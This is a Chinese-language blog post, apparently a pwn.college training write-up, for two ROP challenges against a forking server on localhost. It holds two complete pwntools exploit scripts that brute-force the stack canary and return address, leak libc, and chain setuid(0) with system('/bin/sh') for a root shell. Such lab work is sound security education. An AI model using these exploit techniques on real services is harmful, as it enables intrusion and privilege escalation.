@@ -1,0 +1,643 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="题目简介14.0和15.0两题放在一起，主要因为这两题方法类似，但又存在一些trick方面的坑这两题目标程序的逻辑相同，均是监听端口、通过fork子进程处理请求，溢出点也在子进程">
+<meta property="og:type" content="article">
+<meta property="og:title" content="level-14-and-15">
+<meta property="og:url" content="http://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-14-and-15/index.html">
+<meta property="og:site_name" content="0x4A">
+<meta property="og:description" content="题目简介14.0和15.0两题放在一起，主要因为这两题方法类似，但又存在一些trick方面的坑这两题目标程序的逻辑相同，均是监听端口、通过fork子进程处理请求，溢出点也在子进程">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/Program-Security/ROP/level-14-and-15/level-14-main.png">
+<meta property="og:image" content="http://0x4a-210.github.io/photos/pwn.college/Program-Security/ROP/level-14-and-15/level-15-main.png">
+<meta property="article:published_time" content="2025-07-20T03:40:17.000Z">
+<meta property="article:modified_time" content="2025-07-20T04:39:09.992Z">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://0x4a-210.github.io/photos/pwn.college/Program-Security/ROP/level-14-and-15/level-14-main.png">
+  
+  
+  
+  <title>level-14-and-15 - 0x4A</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"0x4a-210.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0x4A</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/Istaroth.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="level-14-and-15"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-20 11:40" pubdate>
+          July 20, 2025 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">level-14-and-15</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>14.0和15.0两题放在一起，主要因为这两题方法类似，但又存在一些trick方面的坑<br><br>这两题目标程序的逻辑相同，均是监听端口、通过fork子进程处理请求，溢出点也在子进程<br></p>
+<span id="more"></span>
+<p>先以14.0为例，15.0和其非常类似，只是需要一个类似脑筋急转弯的trick，能想到就很容易，想不到就会一直卡住（比如我靠自己就死活没想到）</p>
+<h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先一样的checksec，看到保护全开<br><br>接下来使用IDA，反编译一下<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-14-and-15/level-14-main.png" srcset="/img/loading.gif" lazyload><br>看到main函数会不停的fork子进程，由子进程调用challenge函数来处理链接<br><br>main函数里正好也没发现溢出点，进challenge看一下，果不其然溢出点就在challenge的read这里<br></p>
+<h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>根据分析，漏洞利用思路就是：<br><br>首先爆破canary的值，爆破的理论基础见<a href="https://0x4a-210.github.io/2025/07/19/TogetherReview/Binary-Exp/">串联梳理：Pwn-Exp</a><br><br>之后爆破函数返回地址拿到程序本身的基地址<br><br>接着用程序本身的gadget去泄露libc基地址，类似level4的方法<a href="https://0x4a-210.github.io/2025/07/20/pwn.college/Program-Securtity/ROP/level-4/">pwn.college题解：ROP-level-4</a><br><br>最后，拿到libc基地址，那就可以随便调用函数去拿shell了<br>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>targetELF=<span class="hljs-string">&quot;/challenge/babyrop_level14.0&quot;</span><br>libcPath = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>],log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment"># ioHandler=gdb.debug(targetELF,&quot;b *main+785&quot;)</span><br><br>offset=<span class="hljs-number">72</span><br><br>elf=ELF(targetELF)<br>libc=ELF(libcPath)<br><br>pop_rdi_offset=<span class="hljs-number">0x26c3</span> <span class="hljs-comment">#challenge里面的偏移，pop rdi碎片用challenge里面的</span><br><br><span class="hljs-comment">#爆破canary</span><br>knownCanary=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>        testByte=test.to_bytes(<span class="hljs-number">1</span>)<br>        payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+testByte<br><br>        ioHandler.send(payload1)<br>        response=ioHandler.recvall().decode()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;stack smashing detected&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response:<br>            knownCanary+=testByte<br>            <span class="hljs-keyword">break</span><br><br><br><span class="hljs-comment">#爆破返回地址，challenge里应该是回到……?636，main里面</span><br>retAddrOffset=<span class="hljs-number">0x2636</span><br>returnAddr=<span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> returnAddr==<span class="hljs-string">b&#x27;&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;爆破失败\n&quot;</span>)<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;&#125;次，遍历到了数字&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>,test))<br>        ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>        payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+returnAddr+p8(test)<br>        <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;PayLoad&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>).write(payload2)<br><br>        ioHandler.send(payload2)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;Leaving!&quot;</span>)<br>        response=ioHandler.recvall(timeout=<span class="hljs-number">3</span>).decode()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Goodbye&quot;</span> <span class="hljs-keyword">in</span> response:<br>            returnAddr+=p8(test)<br>            <span class="hljs-keyword">break</span><br><br>returnAddr=<span class="hljs-built_in">int</span>.from_bytes(returnAddr,<span class="hljs-string">&quot;little&quot;</span>)<br>elfBase=returnAddr-retAddrOffset<br>pop_rdiReal=elfBase+pop_rdi_offset<br>elf.address=elfBase<br>retPadAlign=elfBase+<span class="hljs-number">0x101a</span><br><br><span class="hljs-comment">#泄露libc基地址</span><br>pltAddr=elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>leakFuncName=<span class="hljs-string">&quot;setvbuf&quot;</span><br>leakFuncOffset=libc.symbols[leakFuncName]<br>leakFuncGOT=elf.got[leakFuncName]<br><br><br>ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>payload3=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>) + knownCanary + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(pop_rdiReal) + p64(leakFuncGOT) + p64(retPadAlign) + p64(pltAddr)<br>ioHandler.send(payload3)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;Leaving!\n&quot;</span>)<br><br>realAddr=u64(ioHandler.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcBase=realAddr-libc.symbols[leakFuncName]<br><br><span class="hljs-comment">#print(&quot;泄露函数名=&#123;&#125;；真实地址=&#123;&#125;；该函数偏移=&#123;&#125;；libc基址=&#123;&#125;\n&quot;.format(leakFuncName,hex(realAddr),hex(leakFuncOffset),hex(libcBase)))</span><br><br><span class="hljs-comment">#最后阶段，调用system的准备</span><br>sysAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>setuidAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;setuid&quot;</span>]<br>binshAddr=libcBase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><br><span class="hljs-comment">#开始最后阶段调用system</span><br>ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br>payload4=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdiReal)+p64(<span class="hljs-number">0</span>)+p64(setuidAddr)+p64(pop_rdiReal)+p64(binshAddr)+p64(sysAddr)<br>ioHandler.recv()<br>ioHandler.send(payload4)<br><br>ioHandler.recv()<br>ioHandler.interactive()<br></code></pre></td></tr></table></figure>
+<h1 id="level15-0的trick"><a href="#level15-0的trick" class="headerlink" title="level15.0的trick"></a>level15.0的trick</h1><p>其实，level15.0和14.0的源码结构基本上都一致，唯一的区别就是15.0是在main函数里直接处理请求，因此没有challenge函数了<br><br>也就是说溢出后返回地址是libc里面的地址，如下图<br><br><img src="/../../../../photos/pwn.college/Program-Security/ROP/level-14-and-15/level-15-main.png" srcset="/img/loading.gif" lazyload><br>这会带来一个问题，因为我们注意到在level14.0中，是如何判断返回地址爆破正确还是错误？是通过输出，因为如果返回到main函数，会相应输出”Goodbye”,如下：<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Goodbye&quot;</span> <span class="hljs-keyword">in</span> response:<br>            returnAddr+=p8(test)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+<p>但是，15题是从main函数返回，转而调用exit，因此即便正确爆破返回地址，也没有任何输出供我们判断<br><br>这里卡了很久……，最后经提醒才想到：<br><br>为什么一定要爆破返回地址的值呢？<br><br>最终目的是拿到libc基址，又不是要爆破返回地址！<br><br>所以，既然原返回地址后面没输出，那就跳到main开始的地方去，那里有输出啊！<br><br>这样，思路就转化成爆__libc_start_main的地址即可，反正__libc_start_main也在libc库里面<br><br>综上，写出的利用脚本如下：<br></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br>targetELF=<span class="hljs-string">&quot;/challenge/babyrop_level15.0&quot;</span><br>libcPath = <span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;x86_64&#x27;</span>, terminal=[<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>],log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment">#ioHandler=gdb.debug(targetELF,&quot;b *main+785&quot;)</span><br><br>offset=<span class="hljs-number">104</span><br><br>elf=ELF(targetELF)<br>libc=ELF(libcPath)<br><br><span class="hljs-comment">#爆破canary</span><br>knownCanary=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>        testByte=test.to_bytes(<span class="hljs-number">1</span>)<br>        payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+testByte<br><br>        ioHandler.send(payload1)<br>        response=ioHandler.recvall().decode()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;stack smashing detected&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> response:<br>            knownCanary+=testByte<br>            <span class="hljs-keyword">break</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">KillProc</span>(<span class="hljs-params">response</span>):<br>    pattern = <span class="hljs-string">r&quot;(\d+):\ttransferring control&quot;</span><br>    matches=re.findall(pattern,response)<br>    <span class="hljs-keyword">if</span>(matches):<br>        pid=(<span class="hljs-built_in">int</span>)(matches[<span class="hljs-number">0</span>])<br>        os.kill(pid, signal.SIGTERM)<br><br><br><span class="hljs-comment">#该如何衡量main函数的返回地址“猜对了”还是“猜错了”？？？</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">main退出流程：</span><br><span class="hljs-string">1 main-&gt;return 0，执行ret指令之前rsp指向的地方存着mov rdi,rax指令的地址，然后pop rip</span><br><span class="hljs-string">2 跳去执行mov rdi,rax（此时rax=0），这个0将作为exit的参数</span><br><span class="hljs-string">3 call exit</span><br><span class="hljs-string">没有输出？？？</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">response</span>): <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;This challenge is listening for connections on TCP port 1337.&quot;</span> <span class="hljs-keyword">in</span> response:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-comment">#爆破__libc_start_main地址</span><br>returnAddr=<span class="hljs-string">b&#x27;\x2D&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">if</span> i==<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> returnAddr==<span class="hljs-string">b&#x27;\x2D&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;爆破失败\n&quot;</span>)<br>        sys.exit()<br>    <span class="hljs-keyword">for</span> test <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&#123;&#125;次，遍历到了数字&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>,test))<br>        ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br><br>        payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+returnAddr+p8(test)<br><br>        ioHandler.send(payload2)<br>        ioHandler.recvuntil(<span class="hljs-string">&quot;Leaving!&quot;</span>)<br>        response=ioHandler.recvall(timeout=<span class="hljs-number">3</span>).decode()<br>        ioHandler.close()<br>        <span class="hljs-keyword">if</span> check(response):<br>            returnAddr+=p8(test)<br>            <span class="hljs-keyword">break</span><br><br>returnAddr=<span class="hljs-built_in">int</span>.from_bytes(returnAddr,<span class="hljs-string">&quot;little&quot;</span>)<br><span class="hljs-comment">#最后阶段，调用system的准备</span><br>iThinkRetOffset=<span class="hljs-number">0x2402d</span><br>libcBase=returnAddr-iThinkRetOffset<br>pop_rdiReal=libcBase+<span class="hljs-number">0x23b6a</span><br>sysAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>setuidAddr=libcBase+libc.symbols[<span class="hljs-string">&quot;setuid&quot;</span>]<br>binshAddr=libcBase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))<br><span class="hljs-comment">#print(&quot;泄露出的返回地址=&#123;&#125;,认为偏移=&#123;&#125;，libc基地址=&#123;&#125;\n&quot;.format(hex(returnAddr),hex(iThinkRetOffset),hex(libcBase)))</span><br><br><span class="hljs-comment">#开始最后阶段调用system</span><br>ioHandler=remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>ioHandler.recvuntil(<span class="hljs-string">&quot;might take anywhere from 0-12 bits of bruteforce depending on the scenario.&quot;</span>)<br>payload4=<span class="hljs-string">b&#x27;a&#x27;</span>*(offset-<span class="hljs-number">16</span>)+knownCanary+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(pop_rdiReal)+p64(<span class="hljs-number">0</span>)+p64(setuidAddr)+p64(pop_rdiReal)+p64(binshAddr)+p64(sysAddr)<br>ioHandler.recv()<br>ioHandler.send(payload4)<br><br>ioHandler.recv()<br>ioHandler.interactive()<br></code></pre></td></tr></table></figure>
+<p>哎，所以总结一下，还是那句话，时刻拷问自己：什么是目的，什么是手段，防止陷入思维定势分不清目标<br></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn-college%E9%A2%98%E8%A7%A3/" class="category-chain-item">pwn.college题解</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/pwn-college%E9%A2%98%E8%A7%A3/Program-Security/" class="category-chain-item">Program-Security</a>
+  
+  
+    <span>></span>
+    
